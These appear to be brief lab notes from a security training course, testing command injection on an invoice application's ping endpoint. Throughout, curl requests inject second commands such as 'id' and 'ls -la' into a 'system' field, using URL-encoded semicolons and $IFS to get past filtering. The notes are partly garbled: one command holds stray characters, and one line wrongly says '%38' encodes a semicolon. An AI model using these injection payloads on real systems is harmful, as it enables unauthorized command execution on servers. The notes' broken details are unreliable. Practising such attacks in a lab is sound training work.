**Specifies a custom request method to use when communicating with the HTTP server**
```python3
curl -X POST http://invoice.awesome-sparrow.sec588.cloud/ping --data 'system=127.0.0.1'e[ew[edx
```
>


**Test for command injection by adding another command such as ;**
```python3
curl -X POST http://invoice.awesome-sparrow.sec588.cloud/ping --data-raw 'system=127.0.0.1%3Bid'
```
>
    --data-raw :  Used to send raw information with no filtering in cURL. Required to send the embedded commands
    %38        :  URL encoded ;


**Explore the filesystem**
```python3
curl -X POST http://invoice.awesome-sparrow.sec588.cloud/ping --data-raw 'system=127.0.0.1%3Bls%24IFS-la'
```
```
%24: URL Encoded $
IFS: IFS (In this case it would be interpreted as $IFS) stands for Internal Field Separator. In our case that would be a `space`
```
  
